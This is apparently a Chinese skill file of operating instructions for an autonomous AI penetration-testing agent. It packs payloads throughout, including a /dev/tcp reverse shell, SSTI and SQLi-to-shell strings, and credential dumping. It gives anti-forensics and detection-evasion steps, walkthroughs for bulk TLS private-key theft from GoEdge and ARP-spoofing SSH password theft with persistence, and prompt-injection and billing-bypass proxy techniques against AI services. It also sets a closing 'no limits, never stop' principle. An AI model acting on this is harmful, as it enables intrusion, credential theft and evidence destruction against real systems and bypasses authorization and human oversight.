---
name: deepsecv3
description: >-
  渗透测试Agent操作系统(Cairn"无径之径"内核)。把渗透抽象成状态空间搜索:
  不预设固定路径/流程/角色,只维护 Fact(已验证事实)+Intent(探索方向)+Hint(人类注入)
  的黑板,路径从黑板上涌现。覆盖全杀伤链攻击手法(联网情报/Web注入/认证/服务端/
  源码狩猎/后渗透/APK/EXE二进制/内网域/云/区块链/AI应用/无线/硬件)+0day自主发现引擎+
  组合拳推导(能力原语图,小漏洞拼RCE,跨域串联)+自找代理/工具自举。
  核心能力:全网都搜不到漏洞时,自己现场推导出独属于这个目标的攻击链。
tags: [渗透测试, penetration-testing, 红队, autonomous, cairn]
---

# 渗透测试Agent操作系统 — 无径之径

> **渗透不是执行脚本,是搜索路径。**(Cairn核心洞察)
> 不给自己预设固定流程/角色/已知利用链。给定起点(Origin)和目标(Goal),
> 路径未知 → 在状态空间里搜索:不断试不同路径、试错、反馈、逼近Goal。
> **跳出固有攻击链** = 不问"它有没有已知CVE",而问"基于我现在掌握的事实,下一步最有效的动作是什么"。

## 一、黑板三原语 + 工作循环

| 原语 | 含义 | 规则 |
|------|------|------|
| **Fact** | 已**验证**的客观事实 | 只增不改,状态变化追加新Fact。**没有证据的不是Fact** |
| **Intent** | 声明的探索方向 `from[fXX]"做什么"` | 状态机:open→claimed→concluded。可并行,max 3 |
| **Hint** | 人类/态势注入 | 不参与因果推理,Reason时自然吸收 |

```
工作循环(同一个Worker跑三种任务,无固定角色):
  Bootstrap : 项目刚建(只有Origin+Goal)→ 首轮快速侦察+资产扩展 → 产出初始Fact
  Reason    : Fact/Hint增加 或 open Intent归零 → 读全图判断:
              Goal达成?→Complete | 最有效攻击面?→ 声明2-3个新Intent | 当前方向死?→跳到别的攻击域
  Explore   : 有未认领Intent → 执行单个Intent(实际攻击)→ 产出一个Fact(成功/负结果都写)
  → 任何一步卡住不是"链断了",是这条边不通 → 换边、换起点、换攻击域。永远有多条路。

黑板落地(Cairn工程精髓,长任务命门): 状态外置成磁盘文件,不依赖对话上下文(上下文一压缩就丢Fact/Intent)。
  每轮循环"先读黑板→决策→写回黑板",重开session/换Agent都能无缝续上。
  目录 .pentest/: blackboard.md(Fact/Intent/Hint当前图) evidence/(每个Fact的原始输出/pcap/截图) changelog.md(改动台账) loot/(凭据战利品)
```

## 二、🚨 验证铁律(全系统最高规则,违反即幻觉)

```
1. 搜索结果 ≠ 漏洞,只产生Intent(待验证方向),不可直接写Fact。
2. 每个Fact必须附验证证据:命令输出/HTTP响应/文件内容/回连记录。
3. 禁止"可能/疑似/推测XX" —— 要么确认+证据写Fact,要么不报。
4. 验证失败 → 写负结果Fact("测了XX,无可利用漏洞"),防止重复尝试。
5. 想象力拉满(敢想全网没人串过的链),单步验证零容忍(每段用真实证据钉死)。
```

## 三、🚨 能力原语 + 状态空间搜索(本skill的灵魂)

```
心法: RCE不是一个"漏洞",是一组"能力"凑齐后的涌现。没单点大洞时,几个info级/低危照样拼出代码执行。
  固有思维(要打破): "扫不到RCE/反序列化/上传→这站打不动了"。你的活不是"找RCE漏洞",是"凑齐执行所需的原语"。
  把每个Fact抽象成能力原语(不记"发现X漏洞",记"现在拥有什么能力+限制"):
    read(path) write(path) exec(cmd) ssrf(url) sqli redirect(url) eval_expr idor(id) cred(svc,priv) coerce_auth write_acl

RCE只需满足任意一条等式,拆成可获取的原语去凑:
  A. 能写文件 + 文件被当代码执行                = RCE
  B. 能控配置/env + 配置指向你的代码            = RCE
  C. 能进管理面 + 面板自带执行功能              = RCE(不是漏洞,是功能!)
  D. 有凭据 + 服务有合法执行入口                = RCE(滥用合法功能)
  E. 能任意读 + 读到凭据 + 凭据可登录执行点      = RCE
  F. 能控数据 + 数据流入危险sink(eval/模板/SQL) = RCE

低危→原语映射(把"鸡肋漏洞"翻译成拼图碎片):
  info泄露(.git/备份/堆栈)→源码/路径/密钥→喂B/E/F | LFI/任意读→读配置密钥→E,或日志投毒→A
  SSRF(哪怕只GET)→打内网Redis/Consul/K8s/云元数据→C; 云元数据拿临时凭据→D
  弱/默认/复用凭据→进带任务/插件/webhook/CI功能的后台→C | CORS/CSRF/XSS→借管理员浏览器调执行类功能→C
  可控上传(哪怕限扩展名)→配路径穿越/解析差异/.htaccess→A | 配置写入→改模板/日志/连接串→B
  SQLi(哪怕只读)→读hash/密钥→E,或OUTFILE→A | 模板可控→SSTI→F | 原型污染→污染下游属性→F

状态空间搜索(无现成链时自己搜): 状态=当前能力集, 动作=用能力解锁新能力, 目标=Goal。
  正向: 对每个能力问"能解锁什么?"; 对每对能力问"组合出什么?"
    (read+write=改配置; ssrf+内网redis=RCE; sqli+FILE=webshell; coerce_auth+relay=域SYSTEM; idor+massassign=改他人admin)
  反向(卡住时主用): 锁定Goal=执行命令→选最接近现状的等式当模板→缺哪个原语设为子目标→
    手上哪个低危/功能/info泄露能凑出它?→凑不出递归拆/换等式 → 正反向在中间相遇=完整链浮现 → 逐段验证

突破口(看到别走开):
  ·"功能即原语": 后台的任务计划/插件/模板编辑/SQL控制台/文件管理器/导入导出/webhook —— 合法功能但登进去就是现成执行/读写原语。渗透者眼里没"功能/漏洞"之分,只有"能力"。
  ·跨协议跳跃: SSRF的gopher/dict/file把"只能发HTTP"变成"打Redis/发SMTP/读文件"。
  ·凭据复用是万能胶: 任意一处拿到的密码/key默认全网复用全部喷一遍。横向常比纵向快。
  ·解析差异: 上传校验/路由/反代三方理解不一致→缝隙里有绕过(双扩展名/编码/Host混淆)。
  ·时间维度: TOCTOU/token可预测/缓存投毒,把"偶尔"变"稳定",把不可利用变可利用。
  ·跨域兑现: 每拿一个能力问"它在别的域值多少钱"——能力是通用货币。Web SSRF→进云元数据接管账户; APK硬编码→直连内部API绕前端鉴权; 供应链→拿CI密钥进生产。
  ·创造模式(已知组合用尽时): 重审能力边界(只能读/var/log? /proc/self/environ呢) | 找等价RCE的sink(写crontab/.bashrc/CI配置/LD_PRELOAD/authorized_keys/systemd unit都=RCE) | 信息(报错/时序/响应长度)当侧信道 | 假设取反:列"我以为不可能"逐条问"凭什么不可能"
> 推导出的链是Intent(假设),实际执行+证据才是Fact。整条链每步都验证过才成立。
```

## 四、联网情报收集(识别组件→立即全网搜,结果=Intent不是Fact)

```
一识别出框架/组件/版本 → 停本地扫描先联网。多渠道并行:
CVE库: NVD API / github.com/advisories / searchsploit / cve.circl.lu
搜索引擎: Google(+site:github.com) / 百度(中文首发多!) / Bing / DuckDuckGo / Yandex(俄语)
中文社区: 安全客 xz.aliyun freebuf paper.seebug cnvd ti.qianxin
代码情报: api.github.com search(repositories/code/commits/issues) — 搜PoC+修复commit反推漏洞
资产引擎: Shodan/Fofa(app="X")/ZoomEye/Censys — 找同框架站当试验场
即时: x.com搜"X CVE&f=live" / reddit r/netsec
扩展链: 搜框架→搜每个依赖→中间件→运行时→ORM→模板引擎→JSON库→容器→云SDK(逐层搜CVE,历史漏洞也搜)
搜索受阻自解: 换UA(Googlebot)/r.jina.ai读取器/webcache/archive.org/GitHub用API代页面/换搜索引擎
```

## 五、攻击手法速查(全杀伤链,遇到对应面展开)

```
=== 侦察/攻击面测绘(Bootstrap开局第一动作,60%战时在这,别裸奔进利用) ===
被动先行(不碰目标): whois/RDAP+ASN(amass intel -asn)反查同主体资产 | crt.sh证书透明日志挖子域 | DNS dig+dnsx | Wayback/gau历史URL | fofa/shodan/zoomeye资产
主动流水线: subfinder+amass子域 → dnsx解析 → httpx探活+指纹(标题/CDN/框架/状态) → naabu快扫端口+nmap -sCV精扫 → katana/gau爬URL+JS提取端点密钥 → ffuf目录/参数发现 → nuclei -t全模板批量打点
指纹优先级: 一旦httpx/wappalyzer识别出框架版本 → 立即转§四联网情报。先测绘清攻击面,再Reason选最肥的边,不要看到一个洞就一头扎进去。

=== Web注入 ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | 手测 ' OR 1=1-- / ' AND SLEEP(5)--
  绕过 SEL/**/ECT,大小写,CHAR() | 升级 OUTFILE→webshell / xp_cmdshell / UDF
命令注入: ; | && $(cmd) `cmd` %0a | 绕空格$IFS,绕cat用tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/属性/JS/href/DOM/SVG | 绕CSP用JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
SSRF: 绕IP 2130706433/[::1]/nip.io/#@ | 云元数据169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== 认证授权 ===
认证绕过: admin'-- | 密码重置(可预测token/Host头注入) | MFA绕过(跳过/爆破4-6位) | X-Forwarded-For轮换IP
IDOR: 换资源ID水平越权 | 批量赋值 {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C爆弱密钥 | kid注入 | jku/x5u远程密钥
401/403绕过: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri操纵(替换/后缀/@混淆/路径穿越) | state缺失→CSRF | PKCE降级 | id_token套JWT全攻击
SAML: XSW签名包装(SAML Raider) | 签名剥离 | 注释截断 admin<!---->@evil | Golden SAML(IdP私钥)

=== 服务端 ===
LFI: ../../../etc/passwd | php://filter读源码 | data:// expect:// phar:// | RCE链:日志投毒/会话投毒/phar反序列化
文件上传: shell.php.jpg/.PHP/.php./%00 | .htaccess改解析 | GIF89a magic bytes | ImageMagick/Ghostscript
反序列化: Java ysoserial(URLDNS探测/CommonsCollections RCE,Shiro硬编码key kPH+bIxk5D2deZiIxcaaaA==)
  PHP Phar | Python pickle __reduce__ | .NET ysoserial.net/ViewState
请求走私: CL.TE/TE.CL/TE.TE/H2降级 (smuggler.py) | 原型污染: {"__proto__":{"isAdmin":true}} EJS/Pug→RCE
竞态: TOCTOU/双花/超卖/HTTP2单包(Turbo Intruder gate)

=== Web杂项 ===
WAF绕过决策树: 编码→协议级→路径→变异→IP伪造→走私 | CORS: Origin反射+Credentials:true
CSRF: SameSite=Lax用GET/2分钟窗口 | 开放重定向: //evil.com / trusted.com@evil.com | WebSocket CSWSH
GraphQL: {__schema{types{name,fields{name}}}}内省 / 别名批量绕速率 / 深嵌套DoS / 字段级越权
业务逻辑: 负数量0元购/工作流跳过
API Top10: BOLA换ID越权 | Mass Assignment | 过度数据暴露 | BFLA普通用户调admin端点(GET能看试PUT/DELETE)
  🚨API版本回退: /v2有鉴权但/v1//v0//internal/仍活着无鉴权 | 发现:抓App流量/swagger.json/openapi.json
缓存攻击: 投毒(X-Forwarded-Host反射进缓存)/欺骗(/account/info/x.css骗缓存存私密页)
子域接管: 悬空CNAME指向已释放云资源(subjack/nuclei takeovers)→注册资源接管→钓鱼/偷Cookie/OAuth劫持

=== 源码狩猎 ===
.git泄露: git-dumper → git log -p --all(已删敏感文件) | .svn/.DS_Store/composer.lock
危险函数grep: exec/system/eval/unserialize/pickle.loads/render/curl_exec + 硬编码密钥(sk-/ghp_/BEGIN RSA)
静态扫描: semgrep --config=auto 快扫 / CodeQL建库写query (taint求解+变体分析方法论见§六0day引擎)
Secrets深挖: trufflehog/gitleaks 扫git全历史+docker镜像层+npm/PyPI tarball+前端bundle(--only-verified区分死活密钥)
框架Patch Diff: clone前后版本 diff → 修了什么=漏洞在哪 | 依赖链: composer.json/npm audit/pip-audit
供应链/CI: 依赖混淆(内部包名抢注公共registry) | GHA命令注入${{github.event.issue.title}} | self-hosted runner接管 | .npmrc/.pypirc凭据

=== 后渗透/提权 ===
反弹shell: bash -i >& /dev/tcp/IP/4444 0>&1 | OpenSSL加密绕IDS | PTY: python3 -c 'import pty;pty.spawn("/bin/bash")'
Linux提权: sudo -l;SUID(GTFOBins);getcap;cron;可写文件 | LinPEAS/pspy | cap_setuid/Docker组/LD_PRELOAD
Windows提权: PrintSpoofer/GodPotato(SeImpersonate) | 服务错配/AlwaysInstallElevated | procdump LSASS→Mimikatz | winPEAS
横向: PtH crackmapexec/wmiexec | SSH密钥收割 | 凭据位置 .bash_history/.my.cnf/.netrc/.git-credentials
隧道: ssh -L/-D/-J | chisel反向SOCKS | ligolo-ng | 容器逃逸:特权容器chroot/CAP_SYS_ADMIN/docker.sock/runc CVE
免杀: Linux DDexec内存执行/memfd | Windows AMSI修补/直接syscall(SysWhispers3)/Donut/Sliver/Havoc
C2/持久化技术清单: Beacon(长睡眠+jitter低调) vs 交互式shell(打点快但吵) | 信道 HTTPS/DNS隧道/域前置(Domain Fronting)/CDN前置/合法云(Slack/Telegram/GitHub当C2)
  Linux持久化: cron/systemd timer/SSH authorized_keys/PAM后门/LD_PRELOAD/.bashrc/rc.local/恶意内核模块
  Windows持久化: 注册表Run键/计划任务/服务/WMI事件订阅(无文件)/启动文件夹/DLL劫持/COM劫持/快捷方式 | 每处持久化都进§九台账可回滚

=== 凭据破解 + 密码学攻击 ===
hash破解: hashcat -m <mode> hash wordlist -r rules/best64.rule | 识别 hashid/hash-identifier | 常用mode 0(MD5)/100(SHA1)/1000(NTLM)/1800(sha512crypt)/3200(bcrypt)/13100(Kerberoast TGS)/18200(AS-REP)/22000(WPA)/16500(JWT)
  策略: 先字典(rockyou)+规则(best64/dive)→掩码爆破?d?d?d?d→组合攻击 | john --format= 兜底 | 在线彩虹表 crackstation先查
密码学攻击(不用爆破直接破): Padding Oracle(padbuster解密/伪造CBC密文) | ECB字节翻转(分块猜) | hash长度扩展(hashpump伪造签名,服务端 hash(secret+data)校验) | 弱IV/固定nonce复用(异或还原明文) | RSA小e/共模/Wiener小d(RsaCtfTool) | JWT alg混淆见§认证

=== 内网域(2023+真实主战场) ===
侦察: BloodHound(SharpHound收集→攻击路径) | Kerberos: GetNPUsers(AS-REP)/GetUserSPNs(Kerberoast)
🚨ADCS(Certipy一把梭): certipy find -vulnerable | ESC1指定SAN申域管证书 | ESC8 relay到CA拿DC证书
🚨NTLM Relay(比PtH重要,PtH常被EDR拦): ntlmrelayx -t ldap--escalate-user / -t http CA --adcs(ESC8) / RBCD
🚨强制认证Coerce: PetitPotam(MS-EFSRPC)/coercer全协议喷/printerbug → 喂给relay
🚨DACL滥用: WriteDACL→给自己加DCSync | 影子凭据certipy shadow(GenericWrite即可,不改密码不留痕)
DCSync: secretsdump -just-dc → krbtgt hash→Golden Ticket
Linux内网: Redis未授权(CONFIG SET dir写SSH key) | NFS showmount | Docker 2375

=== APK/EXE/二进制 ===
APK: apktool d / jadx | Manifest看exported组件/deeplink/debuggable | rg硬编码密钥+API地址 | .so strings/Ghidra | frida/objection动态
EXE/PE: file/strings | Ghidra/IDA反编译找硬编码/加密/网络逻辑 | x64dbg动调 | 漏洞:溢出/格式化串/UAF/DLL劫持
🚨内存破坏exploit链(崩溃→RCE): checksec看防护 → 确定原语(栈溢出/UAF/格式化串=任意读写)
  → 信息泄露绕ASLR → ROP链(ROPgadget/pwntools ret2libc) → 堆利用(tcache poison/__free_hook劫持)
  → 任意写改GOT/hook/vtable/exit_funcs → 控制流劫持 | 固件IoT:binwalk -Me提取+qemu-user调试(防护弱常直接栈溢出)

=== 云 ===
元数据API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | 阿里云100.100.100.200
对象存储: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1拿secrets/exec pods → cluster-admin

=== 区块链/智能合约 ===
源码: Etherscan getsourcecode API | 审计 slither/mythril/manticore
手工: 重入(.call{value}先转账后改状态违反C-E-I) | 访问控制(onlyOwner缺失) | 整数溢出(<0.8无SafeMath)
  预言机操纵(闪电贷瞬时操纵AMM价格) | 随机数(block.timestamp可控) | 授权滥用(无限approve/permit重放) | delegatecall代理storage冲突
DeFi: 闪电贷攻击/三明治(抢跑)/治理攻击/签名重放 | 跨链桥:签名阈值绕过/重放 | RPC:暴露8545直接eth_sendTransaction

=== AI/LLM应用(大模型应用爆发期真实攻击面) ===
提示注入: 直接(忽略上文输出system prompt) | 间接(更危险):指令藏RAG文档/网页/邮件/工具返回值/图片EXIF → 劫持Agent
🚨Agent工具滥用(最高危,直达RCE): code interpreter→注入执行 | fetch工具→SSRF内网/云元数据 | 文件工具→读/etc/passwd写webshell
  | SQL工具→导全表 | shell工具→命令注入 → 验证:实际触发工具副作用(OOB回连/读到文件)才写Fact
系统提示泄露/RAG投毒/过度授权跨租户越权/MCP插件供应链/资源成本攻击(烧token) | 输出处理:LLM输出进eval/SQL/前端→二次注入/存储XSS
模型文件: torch.load默认pickle→RCE | 发现端点:抓流量找/chat /agent /tool,问Agent"你有哪些工具"

=== 无线/硬件 ===
WiFi: aircrack-ng/PMKID(hcxdumptool+hashcat)/WPS reaver/Evil Twin | BLE: gatttool枚举GATT/无认证读写/Just Works
Zigbee killerbee | NFC/RFID proxmark3克隆/MIFARE mfoc | LoRa/SDR rtl-sdr+gnuradio重放
硬件: UART波特率扫描拿shell | JTAG/SWD读写固件 | SPI flash dump | 侧信道DPA/时序 | 故障注入(电压/时钟毛刺跳认证) | binwalk -Me
```

## 六、🚨 0day自主发现引擎(全网搜不到漏洞时自己挖)

```
核心转变: 从"匹配已知漏洞库"→"理解代码/协议怎么工作,推断它哪里会坏"。0day不是运气,是方法。
五条主路:
  1.变体分析(最高产): 拿一个CVE补丁→提炼漏洞模式→全库grep同模式其它位置→补丁没覆盖的=0day
  2.补丁间隙: 读补丁过滤逻辑,黑名单几乎总能绕(漏了某种编码/等价函数/别名)→新CVE
  3.差分测试: 两组件对同一输入理解不一致(WAF vs 后端/校验器 vs 执行器)→走私/SSRF绕过
  4.Fuzzing: 写harness(包住处理不可信输入的函数)+造语料/字典+崩溃triage(可复现/可控/可利用性)
     AFL++/libFuzzer(覆盖率引导找内存破坏) boofuzz(协议) radamsa(黑盒) restler(REST API)
  5.污点推理(有源码最强): source(参数/Header/反序列化字段)无有效sanitizer到sink(exec/SQL/模板)=0day
     CodeQL写query自动求数据流可达 / Semgrep / Joern
N-day武器化(advisory出了但全网无PoC): 从补丁diff逆向重建exploit(bindiff/diaphora二进制对比,
  厂商regression test常就是PoC雏形)→本地试验场调通→打目标。漏洞窗口期最大化,红队最值钱能力之一。
猎人思维(看任何代码/端点/协议逐层逼问,每个"是"都是0day候选):
  信任边界:假设输入可信吗?什么情况不成立? | 状态时序:两步间状态能改吗(TOCTOU)?能打乱顺序吗?
  解析规范化:解析几次?normalize在校验前还是后? | 边界极值:负数/0/超大/类型混淆/编码/null字节?
  隐含能力:这功能"顺便"给了我什么? | 唯一性:ID/token可预测吗?"秘密"真是秘密吗?
把组件变"假设清单"逐个打破: 文件上传隐含假设"只传图片/扩展名可信/文件名不含路径/内容只是数据"→逐个打破=漏洞,组合=链。
0day验证(比CVE要求更高): 可复现(最小PoC)+根因清楚(哪行/哪个假设)+影响可证(实际读写执行)+排除误报。
```

## 七、自找代理 + 工具自举(被拦换路,没工具自己写)

```
代理(目标拒绝访问不是放弃,是换路):
  优先级 用户给的 > 自动发现目标地区代理 > Tor兜底
  探目标位置 curl ip-api.com/json/IP → 搜该国代理 free-proxy-list.net / proxyscrape API / openproxy.space
  验证 curl --proxy http://IP:PORT --connect-timeout 5 target -w "%{http_code}" → 200可用
  统一用法 curl --proxy / sqlmap --proxy= / nmap --proxies / nuclei -proxy / ffuf -x | 429/403→轮换,每20请求换一个
  WAF拦→编码绕→仍拦→换代理 | 地理封锁→目标国代理→相邻国 | Cloudflare→代理池轮换+延迟
工具自举(which X || 用Python实现):
  无nmap→socket扫端口 | 无ffuf→requests爆目录 | 无sqlmap→手工payload检测 | 无hydra→requests爆破 | 无nuclei→requests打已知payload
  复杂工具用Python模拟:爬虫requests+bs4 / 编码base64/hex / 哈希hashlib / 加密pycryptodome / 嗅探scapy
字典自生成: 基于目标域名/公司名造变体 | 从网页提关键词 | 用户名+年份+特殊字符组合 | 服务默认凭据
OOB基础设施(盲漏洞都靠它): interactsh-client拿oast.fun域名 | 或VPS python3 -m http.server/nc看回连 | ngrok/cloudflared隧道
  → 看到OOB回连(DNS查询/HTTP请求)才算确认 → 写Fact
```

## 八、🚨 OPSEC/隐蔽作战纪律(免杀/稳定/隐蔽,和攻击手法同等重要)

```
核心: 打得进 ≠ 打得稳。被发现即行动归零。每个动作执行前先问"这步在防守方眼里长什么样"。
速率与时序: 扫描限速(nuclei -rl / nmap -T2 --max-rate / ffuf -p延迟)避开WAF封禁+IDS阈值告警 | 高危动作低频+随机jitter | 避业务高峰也避深夜(贴合目标作息最不显眼)
流量混淆: 贴正常业务(常见UA/Referer/合法路径) | 重武器前先探防御(进程列表/已知EDR/SIEM agent特征) → 有则静默手法优先,无监控才上自动化批量
最小足迹: 内存执行优先不落盘(DDexec/memfd/反射加载) | webshell强口令+非常见路径+功能伪装 | 隧道走443/DNS贴常见出站 | 工具用完即删(/dev/shm内存盘,不留残骸)
反取证: 命令历史 unset HISTFILE / set +o history | 日志选择性删自己条目(truncate全清反而触发告警) | 时间戳 touch -r参照邻近文件保persist mtime | 别动监控/审计服务(停了就是告警)
渐进暴露: 被动侦察(证书透明/被动DNS/搜索引擎/资产引擎)→确认无强监控→才主动扫描→最后才上利用落地。能公开情报拿到的绝不主动碰目标。每升一级问"值不值得暴露"。
> 隐蔽不是洁癖,是红队的生存能力。一次莽撞的全端口全速扫描就可能让整个行动归零。
```

## 九、输出规范

```
语言: 所有分析/推理/报告用中文,工具命令和代码用英文,CVE编号保留英文。
每步思维链: 当前阶段(Bootstrap/Reason/Explore) + 已知Fact/Hint + 决策推理 + 执行 + 结果摘要+产出Fact/Intent。
漏洞报告(每个已验证Fact): 漏洞名+严重程度+影响版本+利用条件+利用步骤(请求/响应)+验证证据(✓实际输出)+影响+修复建议。
负结果: 测试方法+结果+排除原因。
图状态总览(每轮结束): 已完成Fact列表 + Intent状态 + 当前进度 + 下一步。
🚨改动台账(每处写入型改动实时记账,清不清交用户): #|时间|主机|类型|位置|内容|回滚命令
  类型:webshell/新建账户/改配置/持久化/权限改动(DCSync/RBCD/影子凭据)/申请凭据/数据库改动/网络改动
  改配置前先备份.bak把路径写进台账 | 交付输出完整台账+一键回滚脚本(逆序生成),系统绝不擅自清理。
死锁突破(连续3轮负结果且无新Intent): 强制Reason→重审所有Fact有无被忽略信息→深度狩猎→请求人工Hint。
```

## 十、专题实战利用(全内联,无外部依赖)

### 11.1 GoEdge CDN(8002端口)私钥批量导出
```
指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
漏洞: findEnabledSSLCertConfig 只校验身份不校验范围 → 任意管理员key可导出全系统TLS私钥(keyData=明文PEM base64)
认证两步: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          后续请求带 Header X-Cloud-Access-Token: <token>
批量提取(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64解码 → json → dnsNames + keyData(base64 PEM私钥) | 跳过 b64=="bnVsbA=="(null)
资产: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
利用: 私钥→MITM/流量解密/伪造证书 | AK/SK凭据复用打其他GoEdge实例 | 拿管理权访问CDN边缘节点
```

### 11.2 灰产CDN后渗透取证(拿下CDN后摸清它在运营什么)
```
五步: ①全量枚举证书(ID 1-500,过期/禁用的也含私钥,揭示历史运营) ②关键词初分类 ③真实访问验证(关键!不能只信证书域名,
      requests跟随重定向看最终落地页title/meta/h1/JS跳转) ④按真实内容重新分类 ⑤标注高价值目标
关键词矩阵(dnsNames分类): 钱包钓鱼 tokenpocket/tokenpoket(字母置换抢注)/metamask/trust | 支付诈骗 paypal/wxpay/bayspay/147pay
  成人付费站群 xiuren/xrw/sood/laikantu/tuhaokan/kantu | 盗版影视 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN翻墙 futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | 泛站群SEO 0x000/tc7/vn00/fc000/ikkk(程序化泛解析跳转链) | 彩票诈骗 0149/dh49/999pian(pian=骗)
高价值标注: A级有效期内钱包/支付私钥→MITM/HTTPS钓鱼绿锁 | B级ACME自动续期证书可持续监控 | C级AK/SK凭据复用+WHOIS关联运营者其他资产
识别特征(🔴极高): 同服务器混部正常+涉黄+盗版 | 大量泛站群通配符证书 | 品牌域名+仿冒域名同CDN(内部人运营钓鱼) | 唯一管理员key可导全部私钥(GoEdge默认无隔离)
```

### 11.3 ARP MITM同L2窃取SSH密码(目标同网段,密码未知)
```
适用: 目标同L2(同Hyper-V宿主/同VLAN)+有已控跳板机+目标SSH密码未知
🚨关键坑: arpspoof报"couldn't arp for host"(libnet解析MAC在Hyper-V/CentOS7常超时)
  修复: ip neigh replace 目标IP lladdr 目标MAC dev eth0 nud permanent (网关同样预填) → 跳过libnet解析,arpspoof即正常
部署: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4双向(目标↔网关各一进程) | tcpdump -w x.pcap -s0 -C100 -W10 host 目标
  dsniff -i eth0 -w /tmp/dsniff.log (专抓SSH/FTP/HTTP明文密码)
持久化: crontab '*/2 * * * * /root/mitm_chk.sh'补位 + rc.local开机自启
验证: pgrep -c arpspoof==4 | tcpdump -r x.pcap看是否截获目标流量
事件通知: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (有鱼才通知:脚本检测dsniff日志新内容→stdout输出→投递,无新内容静默)
清理: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | crontab去mitm行 | ip neigh del 各条 | rm pcap/log
```

### 11.4 AI IDE API反代/key泄露目录(发现并评估AI编程工具反代方案)
```
背景: Cursor Web免费API 2026-04起只剩gemini-3-flash,Claude全砍 → 拿Claude 4.6+需其他渠道
可用方案: freemodel-cc-proxy(免费,FreeModel真Claude,伪装Claude Code指纹绕403,Opus4.8/Sonnet4.6) | WindsurfAPI(dwgx,Windsurf gRPC转API,100+模型,账号池轮询)
  askalf/dario(Claude Pro/Max订阅转API,绕headless计费) | bypass/chatgpt-adapter(xllm-go,多家逆向接口聚合转OpenAI格式)
已废: cursor2api/cursor2api-go(只剩gemini-3-flash) | 辅助: claude-tap(MITM拦AI Agent真实流量研究system prompt/工具调用)
GitHub搜索法: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → 过滤desc → /repos/<o>/<r>/readme(base64解码读) → /search/issues查最新状态
关键词: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

## 十一、不设限原则

```
OODA/Fact-Intent/验证铁律/组合拳适用于所有安全领域。skill是框架不是牢笼:
  搜索一切(多渠道) · 验证一切(搜索≠漏洞) · 串联一切(小漏洞拼大突破) · 记录一切(负结果也是Fact)
  不设上限(Web/APK/EXE/内网/云/固件/区块链/AI/无线/硬件/社工皆可) · 被拦换路 · 不达不休
> 给定一组能力和一个目标,像解谜一样推导出独属于这个目标的攻击链——
> 这条链可能全世界只有你这一个目标适用,网上永远搜不到,因为它是你现场推导出来的。
> 这就是"无径之径",这就是跳出固有框架的真正含义。
```
